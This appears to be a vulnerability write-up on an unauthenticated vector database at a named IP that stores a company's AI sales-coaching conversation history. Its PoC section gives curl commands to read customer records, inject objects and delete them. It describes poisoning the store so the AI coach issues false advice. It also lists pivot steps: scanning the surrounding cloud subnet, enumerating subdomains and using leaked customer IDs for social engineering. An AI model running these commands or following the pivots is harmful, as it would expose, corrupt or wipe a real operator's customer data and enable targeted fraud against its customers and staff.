## PoC

### Read -- enumerate class contents

```bash
curl -s "http://47.238.237.94:8080/v1/objects?class=Cmf_ai_data_message_history&limit=5" \
  | jq '.objects[] | {id, conversation_id: .properties.conversation_id, preview: .properties.history[:120]}'
```

### Write -- inject canary object

```bash
curl -s -X POST "http://47.238.237.94:8080/v1/objects" \
  -H "Content-Type: application/json" \
  -d '{
    "class": "Cmf_ai_data_message_history",
    "id": "a86e334e-277f-4b9b-a17f-bf5bc3cb542b",
    "properties": {
      "conversation_id": 999999,
      "text": null,
      "history": "-CANARY-2026-06-20"
    }
  }'
```

### Delete -- confirm destructive access

```bash
curl -s -o /dev/null -w "%{http_code}" -X DELETE \
  "http://47.238.237.94:8080/v1/objects/Cmf_ai_data_message_history/a86e334e-277f-4b9b-a17f-bf5bc3cb542b"

curl -s -o /dev/null -w "%{http_code}" \
  "http://47.238.237.94:8080/v1/objects/Cmf_ai_data_message_history/a86e334e-277f-4b9b-a17f-bf5bc3cb542b"

## Impact

### Confidentiality -- 839 B2B sales conversations exposed

Every AI coaching session is readable without authentication. Records include customer identities, deal values, order numbers, 5-year payment histories, competitor analysis, and deal recovery scripts. This is the operator's complete CRM conversation corpus. Competitors, ex-employees, or any party with a port scan can read it.

### Integrity -- AI coaching injection

Write access allows injecting false coaching advice into the vector store. A salesperson querying the AI coach could receive instructions to offer unauthorized discounts, cite incorrect product specifications, or direct customer contacts to attacker-controlled channels. The AI retrieves from this store -- poisoned records become poisoned recommendations.

### Availability -- full wipe

Delete access with no auth gate means the entire 839-object knowledge base can be destroyed in a single loop. No backup mechanism is visible from the external surface. Loss of this store breaks the AI sales coaching tool.

### Business intelligence leak

Order number format `SL-MOT-260105-CIS` reveals the internal naming convention. Combined with customer IDs and deal context, this is sufficient for targeted social engineering against Router-switch.com customers and sales staff.

## Pivot Avenues

1. `itprice.yejian.tech` (main domain, port 80/443) -- check for admin portal, additional API routes, authentication surface
2. Customer ID 255788 and others in the corpus -- if a CRM platform is co-hosted, enumerate customer records directly
3. Order number format `SL-MOT-260105-CIS` -- internal naming convention usable for social engineering or deal tracking inference
4. Alibaba Cloud subnet (47.238.0.0/16) -- scan adjacent hosts for co-located services under the same operator
5. `yejian.tech` apex domain -- enumerate subdomains for additional services (DNS brute, cert transparency)
